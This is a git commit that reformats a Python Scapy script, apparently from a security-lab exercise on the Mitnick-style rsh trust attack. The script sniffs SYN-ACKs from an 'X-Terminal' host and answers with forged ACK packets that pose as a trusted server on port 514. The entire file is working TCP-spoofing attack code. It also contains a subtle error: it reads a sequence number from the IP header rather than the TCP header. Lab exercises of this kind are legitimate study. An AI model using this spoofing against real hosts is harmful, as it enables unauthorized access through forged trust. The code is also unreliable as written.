fc87a1a00b28e1dcd5d571eb0211f69535b39bc5
Pastoreekahk S Arthur <139224166+pastoreekahk96@users.noreply.github.com>
2026-09-03 21:36:33 +0000

    clean Scapy imports and Python shebang in lab script

--- respond_ack 2.1.2.py
+++ respond_ack 2.1.2.py
@@ -1,32 +1,43 @@
-#!/user/bin/python3
-from scapy.all import*
+#!/usr/bin/env python3
 
-x_ip = "192.168.12.5" #X-Terminal 
-x_port = 514 #Port number used by X-Terminal
+from scapy.all import IP, TCP, send, sniff
 
-srv_ip = "192.168.12.6" #The trusted server 
-srv_port = 1023 #Port number used by the trusted server 
+X_IP = "192.168.12.5"  # X-Terminal
+X_PORT = 514  # Port used by X-Terminal
+
+SRV_IP = "192.168.12.6"  # Trusted server
+SRV_PORT = 1023  # Port used by trusted server
 
 
 def spoof_pkt(pkt):
-	Seq=123456789 + 1
-	old_ip=pkt[IP]
-	old_tcp=pkt[TCP]
+    seq = 123456789 + 1
+    old_ip = pkt[IP]
+    old_tcp = pkt[TCP]
 
-	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 #TCP data length
-	print ("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))
+    tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4
+    print(
+        "{}:{} -> {}:{} Flags={} Len={}".format(
+            old_ip.src,
+            old_tcp.sport,
+            old_ip.dst,
+            old_tcp.dport,
+            old_tcp.flags,
+            tcp_len,
+        )
+    )
+
+    # Construct the IP header of the response.
+    if old_tcp.flags == "SA":
+        print("sending spoofed ACK packet to the X-Terminal (Victim)")
+        ip = IP(src=SRV_IP, dst=X_IP)
+        tcp = TCP(
+            sport=SRV_PORT,
+            dport=X_PORT,
+            flags="A",
+            seq=seq,
+            ack=old_ip.seq + 1,
+        )
+        send(ip / tcp, verbose=0)
 
 
-	#Construct the IP header of the response 
-	if old_tcp.flags=="SA":
-		print("sending spoofed ACK packet to the X-Terminal (Victim)")
-		ip=IP(src=srv_ip,dst=x_ip)
-		tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
-		pkt=ip/tcp
-		send(pkt, verbose=0)
-
-pkt=sniff(filter="tcp and src host 192.168.12.5", prn=spoof_pkt) 
-
-
-
-
+sniff(filter=f"tcp and src host {X_IP}", prn=spoof_pkt)
